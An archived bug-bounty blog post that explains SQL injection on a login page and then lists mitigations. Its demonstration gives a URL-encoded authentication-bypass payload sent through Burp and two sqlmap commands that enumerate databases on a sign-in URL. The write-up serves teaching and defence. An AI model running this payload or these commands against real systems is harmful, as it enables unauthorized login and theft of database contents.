# SQL Injection Vulnerability on Login Page Allows Unauthorized Database Dump

- **Source URL:** https://medium.com/@harshitha431/sql-injection-sqli-9675e21cc54a?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240930171506/https://medium.com/@harshitha431/sql-injection-sqli-9675e21cc54a
- **Fetched:** 2026-11-22
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/7422 (id 7422)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# SQL Injection Vulnerability on Login Page Allows Unauthorized Database Dump

Hi🙋♀️, I’m Harshitha, a passionate cybersecurity researcher dedicated to uncovering the latest in digital security. I focus on identifying vulnerabilities and developing strategies to enhance protection. In this blog, I’ll share my knowledge and experiences to help defend against cyber threats. Join me as we navigate the evolving challenges of safeguarding our digital world!

**What is SQL Injection (SQLi)?** 

SQL Injection is a web security vulnerability that allows an attacker to interfere with the queries a web application makes to its database. This occurs when an application includes untrusted user input directly in SQL queries without proper validation or sanitization.

**Attackers can manipulate these queries to:**

Retrieve sensitive data (such as usernames, passwords, credit card details).

Bypass authentication mechanisms.

Modify, delete, or insert data.

Execute administrative operations on the database.

Take control of the database server in severe cases.

**Impact:**

**Data Theft:** Attackers can access sensitive information stored in the database, such as personal user data, payment details, or confidential business records.

**Data Loss/Alteration:** Attackers may delete or modify data, leading to operational issues, data corruption, or reputational damage.

**Authentication Bypass:** Attackers can bypass login mechanisms, gaining unauthorized access to user accounts, including administrative accounts.

**System Compromise:** In more severe cases, an attacker can gain full control of the database or even execute commands on the underlying server.

**Reputational Damage:** Breaches caused by SQL Injection can lead to loss of customer trust, legal consequences, and financial losses from regulatory fines.

**Practical Demonstration:**

**Step:1** Here in the Login page give random user details & capture in burp.

Step:2 Here in burp give the following payload. “‘%20or%203278%3d3278 — %20”.

**Step:3** Now we logged into the application with random user.

**Step:4** Now in sqlmap give following command

“sqlmap.py -u “[https://example.com/signin.do?username=abc\*&password=abc&login=LOGIN](https://domain/signin.do?username=abc*&password=abc&login=LOGIN)" -risk=3 — level=5 — technique=BEUSTQ”

“sqlmap.py -u “[https://](https://domain/signin.do?username=abc*&password=abc&login=LOGIN)[example.com](https://domain/signin.do?username=abc*&password=abc&login=LOGIN)[/signin.do?username=abc\*&password=abc&login=LOGIN](https://domain/signin.do?username=abc*&password=abc&login=LOGIN)" -proxy=”[http://127.0.0.1:8080](http://127.0.0.1:8080)" — dbs”

**Step:5** Now we can able to see all the database names.

**Mitigation:**

**Use Prepared Statements (Parameterized Queries):** Instead of directly concatenating user input into SQL queries, use parameterized queries, which ensure that user input is treated as data and not part of the query.

**Input Validation:** Ensure that all user inputs are validated and sanitized. Only allow expected data types, and reject inputs that don’t conform to the allowed format.

**Use ORM (Object-Relational Mapping):** Many modern ORM tools automatically protect against SQL Injection by abstracting SQL queries, reducing the chances of introducing vulnerabilities.

**Limit Database Privileges:** Follow the principle of least privilege by granting the database user only the permissions it needs. For example, a web app user should not have administrative rights like DROP or ALTER.

**Error Handling:** Avoid detailed error messages that could reveal information about your database structure to an attacker. Use generic error messages to ensure sensitive data isn’t leaked.

**Regular Security Audits:** Regularly audit your code and run automated vulnerability scans to check for SQL Injection vulnerabilities.

**Web Application Firewalls (WAFs):** Implementing a WAF can help filter and block SQL Injection attacks before they reach your application.

**Reference :**

I hope you all understood what is SQLi injection and how does it works.Stay tuned don’t forget to follow share read.

See you guys in next interesting blog..

Until then bye see you guys…………..👋👋👋👋
